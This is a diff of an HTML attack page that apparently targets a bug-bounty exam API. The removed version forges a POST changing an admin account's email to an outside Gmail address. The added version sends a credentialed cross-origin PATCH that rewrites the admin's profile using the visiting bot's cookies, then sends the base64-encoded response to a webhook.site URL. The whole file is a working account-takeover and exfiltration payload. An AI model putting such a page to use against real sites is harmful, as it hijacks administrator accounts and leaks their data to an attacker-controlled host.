@@ -1,18 +1,42 @@
-
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <body>
-   <script>
-  fetch('/api/auth/profile', {
-    method: 'POST',
-    headers: {
-      'Content-Type': 'application/json',
-    },
-    body: JSON.stringify({
-      id: "69d28e841cda77b519a9550e", // The admin ID you found
-      email: "ladybughuner1@gmail.com"
-    })
-  });
-</script>
+    <h1>Processing...</h1>
+    <script>
+        const targetUrl = 'https://api-bugbounty-exam.hashacademy.co/api/auth/profile';
+        
+        // We attempt to change the admin's profile info. 
+        // If the API allows 'email', we change that to take over.
+        const data = {
+            "fullName": "Admin_Pwned_By_Me",
+            "phoneNumber": "(555) 999-0000",
+            "address": {
+                "street": "Hacker Way",
+                "city": "Tripoli",
+                "state": "LB",
+                "zipCode": "12345",
+                "country": "US"
+            }
+        };
+
+        fetch(targetUrl, {
+            method: 'PATCH',
+            mode: 'cors', // Required for cross-origin
+            credentials: 'include', // Tells the bot to send its cookies
+            headers: {
+                'Content-Type': 'application/json',
+                // Note: We omit X-Participant-Token and hope the API doesn't require it for admins
+            },
+            body: JSON.stringify(data)
+        })
+        .then(response => response.json())
+        .then(result => {
+            // Send the result to your webhook so you can see if it worked
+            fetch('https://webhook.site/9299acf8-393a-4d83-9963-c5763588fb5e?status=success&res=' + btoa(JSON.stringify(result)));
+        })
+        .catch(err => {
+            fetch('https://webhook.site/9299acf8-393a-4d83-9963-c5763588fb5e?status=error&msg=' + btoa(err));
+        });
+    </script>
 </body>
 </html>
